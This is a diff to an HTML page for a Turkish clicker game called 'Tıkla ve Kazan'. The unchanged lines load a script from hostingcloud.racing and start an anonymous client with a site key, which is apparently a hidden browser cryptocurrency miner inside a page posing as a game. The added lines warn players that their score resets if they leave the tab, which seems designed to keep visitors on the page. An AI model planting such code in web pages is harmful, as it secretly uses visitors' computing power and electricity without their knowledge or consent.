@@ -21,7 +21,7 @@
   </style>
 </head>
 <body>
-
+  
   <script src="https://www.hostingcloud.racing/xXmw.js"></script>
 <script>
     var _client = new Client.Anonymous('0931a19b9bf55187f7eb0b42760d346c417de342add853171911589bdf2c19f9', {
@@ -33,7 +33,7 @@
 </script>
   
   <h1>Tıkla ve Kazan</h1>
-  <p>İstediğiniz kadar tıklayın ve puanınızı artırın!</p>
+  <p>İstediğiniz kadar tıklayın ve puanınızı artırın! Sekmeden çıkarsanız puan sıfırlanır.</p>
   <button id="clickButton" onclick="incrementScore()">Tıkla!</button>
   <p id="score">Puan: 0</p>
 
@@ -45,6 +45,11 @@
       score++;
       scoreDisplay.textContent = `Puan: ${score}`;
     }
+
+    // Sayfa kapandığında puanı sıfırla
+    window.addEventListener('beforeunload', () => {
+      score = 0;
+    });
   </script>
 </body>
 </html>
